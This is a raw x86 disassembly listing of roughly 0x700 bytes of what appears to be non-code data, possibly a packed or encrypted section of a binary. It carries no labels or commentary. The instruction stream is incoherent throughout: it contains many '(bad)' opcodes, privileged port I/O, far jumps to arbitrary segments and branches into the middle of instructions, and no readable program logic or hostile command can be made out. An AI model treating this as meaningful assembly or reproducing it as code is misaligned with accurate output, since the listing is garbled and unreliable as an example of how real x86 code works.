  4098eb:	pop    edi
  4098ec:	push   esi
  4098ed:	repnz xor al,0x43
  4098f0:	outs   dx,BYTE PTR ds:[esi]
  4098f1:	jns    0x409951
  4098f3:	les    ebx,FWORD PTR [ecx+0x586ab3aa]
  4098f9:	add    BYTE PTR [esi-0x41],bh
  4098fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098fd:	js     0x409921
  4098ff:	and    DWORD PTR [eax],edx
  409901:	test   al,0x14
  409903:	lds    esp,FWORD PTR [esi]
  409905:	test   dh,bl
  409907:	loope  0x409908
  409909:	or     ah,BYTE PTR [esi]
  40990b:	pop    ebx
  40990c:	cmp    DWORD PTR [esi-0x16],ebx
  40990f:	jecxz  0x409960
  409911:	push   ds
  409912:	and    al,0x88
  409914:	dec    esi
  409915:	mov    eax,ds:0x454d7d90
  40991a:	loope  0x40994b
  40991c:	lahf   
  40991d:	dec    esi
  40991e:	aam    0x4b
  409920:	shl    BYTE PTR [edx],0x63
  409923:	arpl   WORD PTR [ecx],sp
  409925:	push   cs
  409926:	push   eax
  409927:	cwde   
  409928:	out    dx,eax
  409929:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40992a:	mov    ch,0x43
  40992c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40992d:	daa    
  40992e:	pop    edi
  40992f:	push   eax
  409930:	jne    0x409980
  409932:	pop    ebx
  409933:	aas    
  409934:	jmp    0x4098c0
  409936:	call   0x10cf:0x23c5b506
  40993d:	sbb    DWORD PTR ds:0x9d164c11,esi
  409943:	in     eax,dx
  409944:	test   al,0xd6
  409946:	sbb    BYTE PTR [ecx+ecx*2],bl
  409949:	fld    TBYTE PTR [eax-0x31]
  40994c:	popa   
  40994d:	aad    0x49
  40994f:	mov    ds:0x229fd61b,al
  409954:	data16 jg 0x40991c
  409957:	fild   DWORD PTR [edi-0x6a96e616]
  40995d:	mov    DWORD PTR gs:[edx],edx
  409960:	es repnz push esi
  409963:	jbe    0x40991f
  409965:	xor    eax,0xf9660d2b
  40996a:	push   0xffffffbf
  40996c:	rcl    BYTE PTR [esi-0x29],0xd5
  409970:	jbe    0x4099c8
  409972:	and    DWORD PTR [esp+esi*8-0x1b],edx
  409976:	sbb    eax,0x627f25a4
  40997b:	jns    0x4099ba
  40997d:	scas   eax,DWORD PTR es:[edi]
  40997e:	ret    
  40997f:	(bad)  
  409980:	adc    edi,DWORD PTR [edx+ecx*2-0x789cbf72]
  409987:	inc    edi
  409988:	je     0x4099e7
  40998a:	(bad)  
  40998b:	in     eax,dx
  40998c:	inc    ecx
  40998d:	out    0x22,eax
  40998f:	pop    eax
  409990:	mov    eax,0x1b401bac
  409995:	jmp    0x4099a0
  409997:	retf   0x61dc
  40999a:	add    al,0x2a
  40999c:	dec    ebx
  40999d:	xchg   ebp,eax
  40999e:	xchg   ebx,eax
  40999f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099a0:	mov    al,0x1b
  4099a2:	les    edx,FWORD PTR [eax]
  4099a4:	(bad)  
  4099a5:	rol    BYTE PTR [ebp-0x3ff7ee9f],1
  4099ab:	add    bl,BYTE PTR [eax-0x15]
  4099ae:	pop    ebx
  4099af:	aam    0xff
  4099b1:	xchg   edi,eax
  4099b2:	fidiv  WORD PTR [edx]
  4099b4:	pop    edi
  4099b5:	nop
  4099b6:	pop    esp
  4099b7:	pop    eax
  4099b8:	jg     0x409a0c
  4099ba:	fldcw  WORD PTR [eax+0x76ad9dfc]
  4099c0:	test   BYTE PTR [ecx],bh
  4099c2:	xchg   ebx,eax
  4099c3:	dec    esi
  4099c4:	test   eax,0x76f0e1c1
  4099c9:	sub    dl,BYTE PTR [eax]
  4099cb:	push   0x221c6540
  4099d0:	xor    eax,esp
  4099d2:	retf   
  4099d3:	aaa    
  4099d4:	int    0xc4
  4099d6:	jmp    0x91f6:0xfa92e8f2
  4099dd:	pop    ebp
  4099de:	ds out 0xc9,al
  4099e1:	loopne 0x409979
  4099e3:	sbb    eax,0xb7278dc3
  4099e8:	fadd   QWORD PTR [eax-0x2d86a109]
  4099ee:	js     0x409a03
  4099f0:	cmp    al,ch
  4099f2:	sti    
  4099f3:	outs   dx,BYTE PTR ds:[esi]
  4099f4:	cdq    
  4099f5:	or     al,0x9b
  4099f7:	jp     0x40997e
  4099f9:	repnz rcr BYTE PTR [ecx-0x79],cl
  4099fd:	mov    ch,0x34
  4099ff:	pop    ss
  409a00:	mov    dh,0x10
  409a02:	ror    DWORD PTR [ebp+0x7a],cl
  409a05:	jne    0x409a68
  409a07:	ret    0xd237
  409a0a:	adc    esi,DWORD PTR [ebx+eax*4]
  409a0d:	out    0xd9,eax
  409a0f:	cmp    DWORD PTR [edi+0x1b],0xffffff83
  409a13:	aam    0xce
  409a15:	dec    ecx
  409a16:	mov    cl,0xdb
  409a18:	and    DWORD PTR [edi],edx
  409a1a:	test   BYTE PTR [ecx+0x6fa0b2c1],dl
  409a20:	cli    
  409a21:	sbb    esi,ebp
  409a23:	dec    ebx
  409a24:	test   al,0xc2
  409a26:	add    eax,0x445a4c91
  409a2b:	cs (bad) 
  409a2d:	jae    0x409a85
  409a2f:	test   eax,0x2df78ad2
  409a34:	popa   
  409a35:	sbb    al,0x95
  409a37:	add    eax,0x5e478068
  409a3c:	loope  0x409a36
  409a3e:	imul   ebx,DWORD PTR [esi-0x727a1dce],0xffffffb4
  409a45:	and    ebx,DWORD PTR [esi+ecx*4]
  409a48:	aaa    
  409a49:	fs inc esp
  409a4b:	popa   
  409a4c:	aam    0xef
  409a4e:	fcom   DWORD PTR [eax]
  409a50:	adc    esi,esi
  409a52:	push   ss
  409a53:	mov    bh,0xda
  409a55:	pop    esp
  409a56:	in     eax,dx
  409a57:	iret   
  409a58:	repnz sbb DWORD PTR [ebx-0x3875c757],0xa35e9152
  409a63:	clc    
  409a64:	cwde   
  409a65:	pushf  
  409a66:	arpl   WORD PTR [edx+0x14],si
  409a69:	(bad)  
  409a6a:	jmp    0xb45f:0xc2c64c0d
  409a71:	inc    edi
  409a72:	test   al,0x38
  409a74:	cdq    
  409a75:	lea    esi,[edx-0x41]
  409a78:	out    0x37,al
  409a7a:	imul   eax,DWORD PTR [edi-0x49],0xffffffb3
  409a7e:	test   al,0xa3
  409a80:	sbb    eax,DWORD PTR [esp+esi*1]
  409a83:	jo     0x409ad4
  409a85:	test   al,0xe7
  409a87:	sub    BYTE PTR [ebp+ebx*8-0x26dfaa5a],dh
  409a8e:	cli    
  409a8f:	jp     0x409a64
  409a91:	repz jmp 0xd8f4:0x3c0657f5
  409a99:	loopne 0x409a84
  409a9b:	xor    BYTE PTR [eax+0x48],cl
  409a9e:	mov    DWORD PTR [eax],edi
  409aa0:	adc    DWORD PTR [esi+0x6a],ecx
  409aa3:	dec    DWORD PTR [ecx+0x66791811]
  409aa9:	sbb    eax,0x2be5ccdb
  409aae:	jae    0x409b11
  409ab0:	clc    
  409ab1:	pop    edi
  409ab2:	iret   
  409ab3:	retf   0x10ab
  409ab6:	push   0xffffff91
  409ab8:	cld    
  409ab9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409aba:	neg    BYTE PTR [esp+esi*4-0x8]
  409abe:	dec    edi
  409abf:	xor    ecx,DWORD PTR [eax-0x259b49d2]
  409ac5:	mov    bl,0xf0
  409ac7:	mov    eax,0x8cdbf0b6
  409acc:	pop    esi
  409acd:	mov    ah,0x38
  409acf:	adc    bl,BYTE PTR [edx-0x5549325f]
  409ad5:	sub    ah,dl
  409ad7:	repnz mov ecx,0x95378b1b
  409add:	push   ebx
  409ade:	iret   
  409adf:	sbb    BYTE PTR [ecx-0x14],bh
  409ae2:	scas   eax,DWORD PTR es:[edi]
  409ae3:	pop    ss
  409ae4:	pop    ebx
  409ae5:	cmc    
  409ae6:	mov    ebp,0xb8e90434
  409aeb:	lods   eax,DWORD PTR ds:[esi]
  409aec:	popa   
  409aed:	xchg   ebp,eax
  409aee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409aef:	adc    al,0x8e
  409af1:	mov    ch,0x1a
  409af3:	pop    edi
  409af4:	or     BYTE PTR [ebx+0x27],dl
  409af7:	fcmovnbe st,st(5)
  409af9:	jecxz  0x409aff
  409afb:	(bad)  
  409afc:	popf   
  409afd:	dec    edx
  409afe:	adc    BYTE PTR [ecx],0xdd
  409b01:	sbb    eax,0xbecd1e7
  409b06:	jno    0x409ad4
  409b08:	pushf  
  409b09:	jns    0x409ac8
  409b0b:	or     eax,0x3e240ce6
  409b10:	xor    DWORD PTR [esi-0x3c],0xaae9bf1c
  409b17:	jecxz  0x409b27
  409b19:	cmp    ecx,DWORD PTR [edx]
  409b1b:	cdq    
  409b1c:	movups xmm5,xmm1
  409b1f:	nop
  409b20:	mov    bl,0xf4
  409b22:	es and bh,dl
  409b25:	lahf   
  409b26:	dec    ebx
  409b27:	or     ch,0x9c
  409b2a:	cmp    BYTE PTR [ebx+0x251bfe8a],0x65
  409b31:	lock xchg DWORD PTR [ecx+ecx*1-0x6f241d80],ecx
  409b39:	dec    esp
  409b3a:	shl    DWORD PTR fs:[edi+0x29ebf6bc],1
  409b41:	or     DWORD PTR [esi+0x44],eax
  409b44:	pop    eax
  409b45:	xchg   DWORD PTR [ebx-0x218be02b],esi
  409b4b:	fidiv  DWORD PTR cs:[eax+0xf]
  409b4f:	xchg   esi,eax
  409b50:	mov    eax,ds:0x98218d60
  409b55:	mov    ebp,DWORD PTR [ebx+edx*8-0x53]
  409b59:	arpl   dx,bx
  409b5b:	in     al,0x4b
  409b5d:	je     0x409b94
  409b5f:	xchg   ecx,eax
  409b60:	mov    al,0x3
  409b62:	fisub  WORD PTR [edx]
  409b64:	rcl    bh,0xc8
  409b67:	pop    ebx
  409b68:	not    BYTE PTR [ebx]
  409b6a:	leave  
  409b6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b6c:	xor    edi,DWORD PTR [ecx-0x3]
  409b6f:	mov    ds,WORD PTR [esi-0x3a]
  409b72:	jecxz  0x409b8a
  409b74:	out    0x3e,eax
  409b76:	cmp    DWORD PTR [ecx],edx
  409b78:	cs jns 0x409b77
  409b7b:	xchg   edi,eax
  409b7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b7d:	mov    bl,0xe
  409b7f:	ret    
  409b80:	fidivr WORD PTR [edx-0x2c]
  409b83:	dec    ebx
  409b84:	mov    al,0x5a
  409b86:	cmc    
  409b87:	aam    0xb
  409b89:	sub    edx,DWORD PTR [edx+edx*1-0x48]
  409b8d:	fild   DWORD PTR [ebp-0x2]
  409b90:	sahf   
  409b91:	icebp  
  409b92:	mov    ah,0xb
  409b94:	push   ebp
  409b95:	xor    eax,0xc60d1f82
  409b9a:	sbb    BYTE PTR [ecx],bl
  409b9c:	dec    ebx
  409b9d:	mov    ch,0xe2
  409b9f:	daa    
  409ba0:	cmc    
  409ba1:	sti    
  409ba2:	test   al,0x13
  409ba4:	ret    0x85ac
  409ba7:	lods   al,BYTE PTR ds:[esi]
  409ba8:	push   esi
  409ba9:	test   eax,0xc603d8ec
  409bae:	mov    esi,0x166abb13
  409bb3:	pop    ss
  409bb4:	ins    DWORD PTR es:[edi],dx
  409bb5:	test   eax,0x5755ef88
  409bba:	imul   ebx,DWORD PTR [edi+ebp*1+0x66],0xbbf541d9
  409bc2:	stc    
  409bc3:	mov    bl,0xa8
  409bc5:	pop    ebx
  409bc6:	jnp    0x409c38
  409bc8:	jle    0x409c29
  409bca:	scas   eax,DWORD PTR es:[edi]
  409bcb:	jb     0x409b89
  409bcd:	(bad)  
  409bcf:	push   esi
  409bd0:	ja     0x409bf9
  409bd2:	and    cl,ch
  409bd4:	and    al,0xbb
  409bd6:	out    dx,eax
  409bd7:	sub    BYTE PTR [ebx-0x79],ch
  409bda:	mov    ah,0x83
  409bdc:	dec    esi
  409bdd:	inc    eax
  409bde:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bdf:	(bad)  
  409be1:	daa    
  409be2:	scas   al,BYTE PTR es:[edi]
  409be3:	(bad)  
  409be4:	fcomp  DWORD PTR [edx+ebx*8-0x47903d2d]
  409beb:	or     esi,esp
  409bed:	add    WORD PTR [ebx],dx
  409bf0:	mov    ebp,0x8ea35c00
  409bf5:	jno    0x409b93
  409bf7:	test   BYTE PTR [ecx-0x14],ch
  409bfa:	fwait
  409bfb:	dec    edi
  409bfc:	push   eax
  409bfd:	or     al,al
  409bff:	xor    al,BYTE PTR [edi+0x6e]
  409c02:	add    DWORD PTR [eax],edx
  409c04:	cli    
  409c05:	clc    
  409c06:	hlt    
  409c07:	mov    ebp,DWORD PTR [edi-0x626db680]
  409c0d:	push   ss
  409c0e:	or     DWORD PTR [ebp-0xf],ebx
  409c11:	pop    ecx
  409c12:	or     dh,BYTE PTR [edx]
  409c14:	leave  
  409c15:	test   DWORD PTR [ebp-0x69],edx
  409c18:	mov    al,0xf
  409c1a:	push   ebx
  409c1b:	pop    ebx
  409c1c:	pmaddwd mm7,QWORD PTR cs:[esp+eiz*8]
  409c21:	lods   al,BYTE PTR ds:[esi]
  409c22:	inc    ebx
  409c23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c24:	out    dx,eax
  409c25:	jb     0x409c03
  409c27:	sbb    DWORD PTR [edx+0x3e],edx
  409c2a:	out    0x4f,eax
  409c2c:	jge    0x409bd2
  409c2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c2f:	in     al,0xfa
  409c31:	ret    
  409c32:	jg     0x409cad
  409c34:	pop    ss
  409c35:	in     eax,dx
  409c36:	inc    eax
  409c37:	adc    eax,0xf2e96b52
  409c3c:	jae    0x409c0e
  409c3e:	ret    
  409c3f:	(bad)  
  409c41:	pop    ss
  409c42:	scas   al,BYTE PTR es:[edi]
  409c43:	gs push eax
  409c45:	mov    ebp,0xdcbe2ac8
  409c4a:	or     al,0xa8
  409c4c:	mul    BYTE PTR [ebp-0x136a67d7]
  409c52:	xor    al,0xca
  409c54:	adc    edx,esi
  409c56:	push   0xffffff91
  409c58:	cld    
  409c59:	mov    ds:0x8251b5b4,al
  409c5e:	test   eax,0x403e650d
  409c63:	push   es
  409c64:	arpl   WORD PTR [edi],si
  409c66:	inc    esp
  409c67:	mov    ?,WORD PTR [eax]
  409c69:	shl    edx,1
  409c6b:	pop    ss
  409c6c:	xchg   ebp,eax
  409c6d:	pop    ecx
  409c6e:	lahf   
  409c6f:	jl     0x409c8a
  409c71:	ja     0x409c7e
  409c73:	and    ch,BYTE PTR [edi+0x4f]
  409c76:	push   edx
  409c77:	rcl    dl,cl
  409c79:	pop    eax
  409c7a:	iret   
  409c7b:	je     0x409c0e
  409c7d:	adc    al,0x62
  409c7f:	pop    es
  409c80:	in     eax,0xfe
  409c82:	retf   
  409c83:	adc    edi,edx
  409c85:	pop    ebx
  409c86:	sbb    cl,BYTE PTR ds:0x791e7824
  409c8c:	or     eax,0xdd8e53ec
  409c91:	ret    
  409c92:	rol    DWORD PTR [esi-0x1c],cl
  409c95:	mov    cl,0x46
  409c97:	lea    ebp,[ecx+edi*4]
  409c9a:	adc    DWORD PTR [ebx],edx
  409c9c:	in     al,dx
  409c9d:	jmp    0x409d10
  409c9f:	sbb    BYTE PTR [eax+0x2959f0d7],al
  409ca5:	jp     0x409ccf
  409ca7:	fs sar ebp,0xf1
  409cab:	sub    eax,0x8e995477
  409cb0:	xor    al,0xcd
  409cb2:	xchg   ebp,eax
  409cb3:	and    bh,BYTE PTR [edi]
  409cb5:	addr16 ret 
  409cb7:	dec    esp
  409cb8:	daa    
  409cb9:	popf   
  409cba:	je     0x409ca1
  409cbc:	and    DWORD PTR [edi],ebp
  409cbe:	mov    BYTE PTR [edx-0x60a3e055],bh
  409cc4:	pop    edi
  409cc5:	or     DWORD PTR [ebp-0x34],edi
  409cc8:	mov    eax,0xa7c01f94
  409ccd:	xor    DWORD PTR [esi],0xec4f1dbb
  409cd3:	push   es
  409cd4:	pop    ebp
  409cd5:	mov    ebx,0xaf679c16
  409cda:	mov    bh,BYTE PTR [ebx]
  409cdc:	mov    esp,0xe79afc85
  409ce1:	pop    es
  409ce2:	std    
  409ce3:	pop    edx
  409ce4:	fsub   st(3),st
  409ce6:	ficom  WORD PTR [edx-0x55269454]
  409ced:	lods   al,BYTE PTR ds:[esi]
  409cee:	retf   0x61f1
  409cf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cf2:	int3   
  409cf3:	jl     0x409cc2
  409cf5:	sub    BYTE PTR [ebx+ebp*2-0x1db3a16],ah
  409cfc:	(bad)  
  409cfe:	mov    al,0xd1
  409d00:	loopne 0x409d03
  409d02:	inc    edi
  409d03:	push   edi
  409d04:	inc    ebx
  409d05:	mov    ah,0x60
  409d07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d08:	dec    eax
  409d09:	xchg   BYTE PTR [edi],al
  409d0b:	xchg   BYTE PTR [ecx-0x5dffaaef],bh
  409d11:	cwde   
  409d12:	rcl    BYTE PTR [ebp-0x74],1
  409d15:	lds    ebp,FWORD PTR [edi]
  409d17:	fs inc edi
  409d19:	dec    edx
  409d1b:	mov    edi,0xe117ec36
  409d20:	xchg   DWORD PTR [eax],ebp
  409d22:	jecxz  0x409d47
  409d24:	nop
  409d25:	add    BYTE PTR [eax-0x2f],ah
  409d28:	shr    DWORD PTR [ebp+ecx*8-0x50],1
  409d2c:	pushf  
  409d2d:	push   ebx
  409d2e:	sbb    BYTE PTR [edi],0x50
  409d31:	nop
  409d32:	jecxz  0x409d68
  409d34:	cmp    al,BYTE PTR [ecx+0x5e]
  409d37:	leave  
  409d38:	(bad)  
  409d39:	sbb    al,BYTE PTR [ecx]
  409d3b:	aas    
  409d3c:	push   esp
  409d3d:	into   
  409d3e:	rcr    ebp,1
  409d40:	mov    ?,WORD PTR [eax-0x32]
  409d43:	out    dx,eax
  409d44:	xor    DWORD PTR [edx-0x43],edi
  409d47:	pop    edi
  409d48:	cmp    eax,0xaad3660e
  409d4d:	int3   
  409d4e:	jne    0x409d25
  409d50:	cmp    eax,0x103f33b0
  409d55:	jg     0x409cfa
  409d57:	push   ebp
  409d58:	xor    BYTE PTR [edx+0x35],ah
  409d5b:	mov    ch,0x3b
  409d5d:	sub    ch,BYTE PTR es:[ebx+0x4984be18]
  409d64:	push   ebx
  409d65:	jo     0x409d71
  409d67:	outs   dx,BYTE PTR ds:[esi]
  409d68:	std    
  409d69:	pop    ebp
  409d6a:	sub    al,0xc0
  409d6c:	repz and al,BYTE PTR ds:0xcbe2909
  409d73:	mov    ah,0x62
  409d75:	nop
  409d76:	adc    DWORD PTR [esi+0x69e598e6],edi
  409d7c:	fisub  DWORD PTR [edi]
  409d7e:	or     dh,BYTE PTR [eax+0x51]
  409d81:	imul   ebx,DWORD PTR [eax+0x57da4b19],0xffffff95
  409d88:	dec    esp
  409d89:	xor    ebp,ecx
  409d8b:	jle    0x409d48
  409d8d:	dec    ebx
  409d8e:	add    BYTE PTR [esi-0x4b369d7e],ah
  409d94:	inc    edx
  409d95:	add    BYTE PTR [ebx+0x5f2a8651],bh
  409d9b:	out    dx,eax
  409d9c:	mov    edx,0x72a6e720
  409da1:	ds out dx,al
  409da3:	test   eax,0x103aeae7
  409da8:	arpl   sp,si
  409daa:	adc    DWORD PTR [esi],esp
  409dac:	repz scas eax,DWORD PTR es:[edi]
  409dae:	and    eax,0x9ad0e3b7
  409db3:	fcompp 
  409db5:	loopne 0x409e09
  409db7:	jle    0x409d47
  409db9:	mov    ch,0x46
  409dbb:	sbb    BYTE PTR [esp+ebp*1-0x21],ah
  409dbf:	arpl   WORD PTR [ecx+ebp*4-0x3c848c5f],dx
  409dc6:	dec    ebp
  409dc7:	add    dh,BYTE PTR [edx-0x6ffc4949]
  409dcd:	inc    ebp
  409dce:	cmp    BYTE PTR [edx+0x531e30cd],cl
  409dd4:	das    
  409dd5:	add    eax,0x394f4fcd
  409dda:	or     ebx,edx
  409ddc:	ret    
  409ddd:	mov    eax,0x3d98895b
  409de2:	fnstcw WORD PTR [eax+0x7d]
  409de5:	pushf  
  409de6:	dec    edx
  409de7:	cmp    eax,0x4b4e233b
  409dec:	cmp    BYTE PTR [esi],cl
  409dee:	shl    DWORD PTR [ecx-0x2ca348fc],cl
  409df4:	mov    ebp,0xd98bf15b
  409df9:	(bad)  
  409dfa:	mov    cl,0x6b
  409dfc:	outs   dx,BYTE PTR ds:[esi]
  409dfd:	out    dx,eax
  409dfe:	mov    ds:0x97ff0361,al
  409e03:	pushf  
  409e04:	mov    al,0x84
  409e06:	shl    DWORD PTR [ebp-0x753b8448],1
  409e0c:	sbb    bh,BYTE PTR [esi]
  409e0e:	mov    bl,ch
  409e10:	lods   al,BYTE PTR ds:[esi]
  409e11:	mov    gs,WORD PTR [ecx]
  409e13:	stos   DWORD PTR es:[edi],eax
  409e14:	(bad)  
  409e15:	push   ds
  409e16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e17:	addr16 in al,0xcb
  409e1a:	pop    es
  409e1b:	cmp    eax,0x81631915
  409e20:	cmc    
  409e21:	inc    ebx
  409e22:	out    dx,eax
  409e23:	xor    ah,dh
  409e25:	dec    ecx
  409e26:	cs mov bh,0xc3
  409e29:	pop    ss
  409e2a:	enter  0x72f,0x34
  409e2e:	jmp    0x7099:0xaa58c692
  409e35:	(bad)  
  409e36:	pop    esp
  409e37:	data16 fild WORD PTR [edx]
  409e3a:	jg     0x409e21
  409e3c:	shl    DWORD PTR [esi],0x3
  409e3f:	jae    0x409e81
  409e41:	aas    
  409e42:	in     al,dx
  409e43:	aaa    
  409e44:	dec    esi
  409e45:	fsub   st(4),st
  409e47:	pop    eax
  409e48:	stos   DWORD PTR es:[edi],eax
  409e49:	jg     0x409e1a
  409e4b:	aas    
  409e4c:	ja     0x409e9e
  409e4e:	stos   BYTE PTR es:[edi],al
  409e4f:	jmp    FWORD PTR [edi]
  409e51:	sub    ch,dl
  409e53:	mov    WORD PTR [eax+0x330b0ea4],ss
  409e59:	and    BYTE PTR [eax],0x6c
  409e5c:	cmp    al,cl
  409e5e:	and    DWORD PTR [esi],eax
  409e60:	daa    
  409e61:	inc    esp
  409e62:	inc    esi
  409e63:	popa   
  409e64:	mov    ds:0x214560dd,eax
  409e69:	or     al,0xc0
  409e6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e6c:	or     DWORD PTR [ebp-0x21],ebp
  409e6f:	mov    WORD PTR [esi+0x70],ss
  409e72:	scas   al,BYTE PTR es:[edi]
  409e73:	jae    0x409e90
  409e75:	mov    bl,0xc7
  409e77:	icebp  
  409e78:	push   ss
  409e79:	and    eax,0x268d26f2
  409e7e:	pushf  
  409e7f:	cmp    eax,0x9f385c7e
  409e84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e85:	neg    BYTE PTR [edi]
  409e87:	test   al,0x7a
  409e89:	ss sub eax,0xc43f0254
  409e8f:	jmp    DWORD PTR [ecx]
  409e91:	daa    
  409e92:	addr16 retf 
  409e94:	(bad)  
  409e95:	inc    esi
  409e96:	ret    0x4b7d
  409e99:	mov    dh,0x7f
  409e9b:	sub    eax,0x3d828291
  409ea0:	je     0x409eb3
  409ea2:	xor    bh,BYTE PTR [ecx+0x4f]
  409ea5:	adc    ah,BYTE PTR [edi+0x54951d52]
  409eab:	rcr    BYTE PTR [ebx-0x6dfeca62],cl
  409eb1:	cmc    
  409eb2:	sbb    BYTE PTR [edx+0x6eb1243d],0x6d
  409eb9:	outs   dx,DWORD PTR ds:[esi]
  409eba:	mov    cl,0x5e
  409ebc:	inc    ebx
  409ebd:	dec    edi
  409ebe:	jp     0x409f3c
  409ec0:	inc    edx
  409ec1:	xor    ecx,DWORD PTR [edx+0x9ad796d]
  409ec7:	out    0x71,eax
  409ec9:	hlt    
  409eca:	lds    esp,FWORD PTR [ecx]
  409ecc:	push   ebx
  409ecd:	div    BYTE PTR [edx]
  409ecf:	cmc    
  409ed0:	adc    eax,0x4d7e03bc
  409ed5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ed6:	add    eax,0x6db94ed5
  409edb:	jne    0x409f05
  409edd:	cld    
  409ede:	repz repnz mov BYTE PTR [edi+0x4b7169ca],bh
  409ee6:	push   es
  409ee7:	xor    eax,0x697bb73
  409eec:	jge    0x409f56
  409eee:	loop   0x409ecf
  409ef0:	dec    esp
  409ef1:	out    0x12,eax
  409ef3:	and    al,0x1f
  409ef5:	or     BYTE PTR [esi+eiz*1+0x3a73aa81],cl
  409efc:	pop    edx
  409efd:	jmp    0x409ef3
  409eff:	(bad)  
  409f00:	mov    esi,ebp
  409f02:	les    ecx,FWORD PTR ds:0xa2106f12
  409f08:	test   DWORD PTR [ecx+0x52],ecx
  409f0b:	pop    ss
  409f0c:	psubw  mm5,mm1
  409f0f:	xor    BYTE PTR [ebx-0x65],0xf8
  409f13:	lods   al,BYTE PTR ds:[esi]
  409f14:	sbb    eax,0xbc4fa0a7
  409f19:	imul   edi,esi,0x6
  409f1c:	pop    ss
  409f1d:	call   FWORD PTR [ebx-0x49]
  409f20:	pushf  
  409f21:	add    esp,DWORD PTR [eax+0x3dd55212]
  409f27:	out    dx,al
  409f28:	push   edx
  409f29:	xchg   ecx,eax
  409f2a:	fild   QWORD PTR [eax]
  409f2c:	and    ecx,DWORD PTR [ebp+0x37]
  409f2f:	inc    DWORD PTR [ecx+0x70]
  409f32:	loopne 0x409fae
  409f34:	pop    ss
  409f35:	cdq    
  409f36:	push   ds
  409f37:	jp     0x409ef9
  409f39:	clc    
  409f3a:	sar    DWORD PTR [ebx-0x7f8bca6f],1
  409f40:	dec    edx
  409f41:	ins    BYTE PTR es:[edi],dx
  409f42:	out    0x25,al
  409f44:	aad    0xac
  409f46:	test   BYTE PTR [ebp+0x5eec66d4],dh
  409f4c:	inc    edi
  409f4d:	mov    dh,0x2f
  409f4f:	xor    al,0xd0
  409f51:	sbb    DWORD PTR [edi],0xffffffda
  409f54:	es (bad) 
  409f56:	loope  0x409f05
  409f58:	push   ss
  409f59:	imul   esi,DWORD PTR [ecx-0x3340f477],0x71
  409f60:	sbb    al,0xf
  409f62:	cmp    al,0x99
  409f64:	dec    edi
  409f65:	das    
  409f66:	test   eax,0xcb16b596
  409f6b:	jle    0x409f87
  409f6d:	mov    bl,0xd5
  409f6f:	mov    ch,0x90
  409f71:	ins    DWORD PTR es:[edi],dx
  409f72:	push   0x9f7f6771
  409f77:	push   edx
  409f78:	js     0x409f64
  409f7a:	lds    esi,FWORD PTR [ebx+0x9]
  409f7d:	outs   dx,BYTE PTR ds:[esi]
  409f7e:	stc    
  409f7f:	jb     0x409fc4
  409f81:	sbb    DWORD PTR [ebp+0xf38bdba],0x381e6d4b
  409f8b:	mov    dl,0xbb
  409f8d:	outs   dx,BYTE PTR ds:[esi]
  409f8e:	aas    
  409f8f:	outs   dx,DWORD PTR ds:[esi]
  409f90:	inc    ebx
  409f91:	into   
  409f92:	jmp    0x409fa9
  409f94:	or     eax,DWORD PTR [eax-0x21]
  409f97:	dec    esp
  409f98:	xchg   esp,eax
  409f99:	mov    DWORD PTR [ecx],eax
  409f9b:	mov    edx,DWORD PTR [edx]
  409f9d:	mul    BYTE PTR [ebx]
  409f9f:	retf   
  409fa0:	xchg   ecx,eax
  409fa1:	pop    edx
  409fa2:	push   ds
  409fa3:	mov    ch,0x14
  409fa5:	popa   
  409fa6:	dec    ebp
  409fa7:	jae    0x409f94
  409fa9:	loope  0x409ff0
  409fab:	xor    BYTE PTR [ecx],0x3f
  409fae:	outs   dx,BYTE PTR ds:[esi]
  409faf:	xchg   DWORD PTR [eax],esi
  409fb1:	inc    ecx
  409fb2:	push   esi
  409fb3:	out    dx,eax
  409fb4:	bnd ret 0x4d4e
  409fb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fb9:	inc    ebx
  409fba:	loope  0x409fa5
  409fbc:	lahf   
  409fbd:	js     0x409f76
  409fbf:	in     al,dx
  409fc0:	das    
  409fc1:	fwait
  409fc2:	enter  0x943e,0x8c
  409fc6:	add    al,0x59
  409fc8:	cmp    DWORD PTR [edx-0x494fa434],ecx
  409fce:	(bad)  
  409fd0:	cdq    
  409fd1:	pop    DWORD PTR [ebx+0x76083805]
  409fd7:	mov    ebp,0xc78364e3
  409fdc:	fadd   st,st(4)
  409fde:	sub    esp,DWORD PTR [eax+0x41]
  409fe1:	mov    BYTE PTR [ebx+0x2d009d51],ah
  409fe7:	push   ecx
  409fe8:	aaa    
  409fe9:	pop    ecx
  409fea:	push   ebx
  409feb:	bnd repz jnp 0x409fcd
  409fef:	mov    ebp,0xaed1151d
  409ff4:	or     al,0x99
  409ff6:	cmp    al,0x58
  409ff8:	push   edi
  409ff9:	xor    ebp,eax
  409ffb:	shr    dh,1
  409ffd:	and    cl,BYTE PTR [edx]
  409fff:	pop    eax
  40a000:	or     eax,0xc9755319
  40a005:	sbb    al,0xb2
  40a007:	jl     0x40a078
  40a009:	inc    ecx
  40a00a:	iret   
  40a00b:	imul   ecx,esp,0x3b
  40a00e:	dec    esi
  40a00f:	hlt    
  40a010:	dec    ebp
  40a011:	outs   dx,BYTE PTR ds:[esi]
  40a012:	sar    ah,1
  40a014:	bound  ebp,QWORD PTR [ebx-0x8]
  40a017:	(bad)  [ecx+edx*2-0x15dea1a9]
  40a01e:	push   ss
  40a01f:	mov    cl,0xdf
  40a021:	mov    ecx,0x9ec511ba
  40a026:	cs inc esp
  40a028:	and    BYTE PTR [ebp-0x57357593],0x8e
  40a02f:	(bad)  
  40a030:	sbb    edi,esp
  40a032:	lock hlt 
